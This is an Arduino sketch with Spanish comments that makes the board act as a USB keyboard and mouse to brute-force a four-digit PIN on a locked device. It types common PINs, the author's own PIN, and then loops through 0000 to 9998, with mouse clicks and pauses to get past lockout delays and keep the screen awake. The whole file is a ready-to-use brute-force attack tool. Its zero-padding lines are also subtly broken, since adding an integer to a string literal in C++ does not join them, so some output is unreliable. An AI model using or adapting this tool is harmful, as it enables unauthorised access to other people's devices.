#include <Mouse.h>
#include <Keyboard.h>

const int buttonPin = 2;          // Pin del boton
int previousButtonState = HIGH;   // Estado del boton
int counter = 0;                  // Contador del boton por cada pulsp
int check = 0;
 
void setup() {
 
  pinMode(buttonPin, INPUT);
 
  Keyboard.begin();
  Mouse.begin();
}
 
void loop() {
 
  int buttonState = digitalRead(buttonPin);
  if ((buttonState != previousButtonState) && (buttonState == HIGH)) {
    
    Mouse.move(25, 50, 0); // mover el raton para que no se apague la pantalla
    // Contraseñas comunes
    delay(1000);
    Keyboard.println("1234");
    delay(500);
    Keyboard.println("4321");
    delay(500);
    Keyboard.println("4321");
    delay(500);
    Keyboard.println("1524");
    delay(500);
    Keyboard.println("5866");
    espera();
   
    Keyboard.println("6432");
    delay(500);
    Keyboard.println("9764");
    delay(500);
    Keyboard.println("4561");
    delay(500);
    Keyboard.println("1524");
    delay(500);
    Keyboard.println("1302");
    delay(500);
    Keyboard.println("3421");
    espera();
    // Mi contraseña
    Keyboard.println("1307");
    delay(500);
    Keyboard.println("1307");
    espera();
    // Recorrido desde 0000 a 9999
    for(int i = 0; i < 10; i++)
    {
      Keyboard.println("000" + i);
      delay(500);
      Keyboard.println("000" + i);
      espera();
    }

    for(int i = 10; i < 100; i++)
    {
      Keyboard.println("00" + i);
      delay(500);
      Keyboard.println("00" + i);
      espera();
    }

    for(int i = 100; i < 1000; i++)
    {
      Keyboard.println("0" + i);
      delay(500);
      Keyboard.println("0" + i);
      espera();
    }
    
    for(int i = 1000; i < 9999; i++)
    {
      Keyboard.println(i);
      delay(500);
      Keyboard.println(i);
      espera();
    }
    
    }   
    
  previousButtonState = buttonState;
}

void espera()
{
    delay(5000);
    Mouse.click();
    delay(5000);
    Mouse.click();
    delay(5000);
    Mouse.click();
    delay(5000);
    Mouse.click();
    delay(5000);
    Mouse.click();
    delay(5000);
    Mouse.click();
}